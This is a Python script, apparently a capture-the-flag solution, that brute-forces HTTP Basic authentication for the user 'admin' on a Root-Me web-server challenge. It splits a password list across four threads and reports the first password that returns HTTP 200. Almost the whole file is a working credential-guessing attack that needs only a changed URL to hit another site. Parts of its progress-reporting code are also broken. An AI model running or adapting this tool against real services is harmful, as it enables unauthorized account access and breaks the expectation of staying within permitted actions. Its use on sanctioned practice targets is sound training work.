from requests import get
from base64 import b64encode
import os
import shutil
import threading
import time

class Environnement():
    def __init__(self, tries):
        self.URL = 'http://challenge01.root-me.org/web-serveur/ch3/'
        self.USER = 'admin'
        self.PATH = "list2.txt"  # Path of password list
        self.TMP_PATH = "./tmp/"  # Created during the runtime -> store the files for each Thread
        self.FAILS, self.ERROR = 0, 0
        self.FLAG = ''
        self.TRIES = tries  # Password number to check : WARNING -> percentage not accurate if to big
        self.FOUND = False
        self.THREAD_NUMBER = 4
        self.FILES_PATHS = []  # Each thread has his file
        self.ATTEMPT = 0
        self.THREAD_PERCENTAGE = threading.Thread(target=self.thread_percentage_func())
    def get_percentage(self):
        return self.ATTEMPT / self.TRIES
    def thread_percentage_func(self):
        last_percentage = 0
        current_percentage = self.get_percentage()
        while current_percentage==100 or self.FOUND==True:
            if int(current_percentage)%10 == 0 and last_percentage != int(current_percentage):
                print(f"[INFO] {current_percentage} %")
            time.sleep(1)

# Init our environnement
env = Environnement(25000)

class BruteForceThread(threading.Thread):
    def __init__(self, path):
        threading.Thread.__init__(self)
        self.path = path
    def run(self):  # path is the file path for the thread using this function. Brute Force basic auth function.
        print('\n\n   [+] STARTING \'%s\'\n\n' % (env.URL))
        print(self.path)
        with open(self.path, 'r') as f:
            for i in range(int(env.TRIES/env.THREAD_NUMBER)):
                if env.FOUND == False:
                    PSW = f.readline().strip()  # Getting password (1 ligne = 1 password)
                    # Finding base64 of the string user:psw
                    INFO = b64encode(f'{env.USER}:{PSW}'.encode()).decode()
                    env.ATTEMPT += 1
                    try:
                        r = get(env.URL, headers={"Authorization": f"Basic {INFO}"})
                        s = r.status_code  # Answer code. 200 = 0K, 401 = Unauthorized
                        if s == 200:  
                            env.TRIES = i + 1
                            env.FLAG = PSW
                            env.FOUND = True
                            break
                        env.FAILS += 1
                    
                    except Exception as e:  # Catch problem
                        print('[ERROR] SOMETHING WENT WRONG')
                        env.ERROR += 1
                        print(e)
                else:
                    f.close()   
            f.close()


def clean_tmp():
    shutil.rmtree("tmp")
    os.mkdir("./tmp")

def print_result():
    print('\n\n   [+] END OF PROCESS\n')
    print('   [FAILS] %s' % (env.FAILS))
    if env.FOUND == True:
        print("\n      > '%s' : '%s' (%s tries)" % (env.USER, env.FLAG, env.TRIES))
        print('\n')

# Create for each thread -> his password list
def thread_file_splitting():
    with open(env.PATH, 'r') as f:
        current_number_thread = 0
        data = ""
        for i in range(env.TRIES):
            line = f.readline().strip()
            data += line+"\n"
            # Checking if it's the moment to split (example : if THREAD_NUMBER = 2 and TRIES = 10, we write/split to an other file at i=5 to i=10)
            if (i-1 != 0 and (i-1) % int(env.TRIES/env.THREAD_NUMBER) == 0) or i+1 == env.TRIES:
                new_path = f"{env.TMP_PATH}{str(current_number_thread)}.txt"
                with open(new_path, 'w') as f_tmp:
                    current_number_thread += 1
                    f_tmp.write(data)
                    f_tmp.close()
                env.FILES_PATHS.append(new_path)
                data = ""



if __name__ == '__main__':
    try:
        os.mkdir("./tmp")
    except:
        pass
    thread_file_splitting()

    # the job list 
    jobs = []
    for i in range(env.THREAD_NUMBER):
        thread =  BruteForceThread(f"{env.TMP_PATH}{i}.txt")
        jobs.append(thread)

    print(jobs)
    try:
        # Start the threads (i.e. brute force with each password list)
        for j in jobs:
            j.start()

        # Ensure all of the threads have finished
        for j in jobs:
            j.join()

    except KeyboardInterrupt:
        print("[STOPPED] Interrupted.")
        env.FOUND = None
    print_result()
    clean_tmp()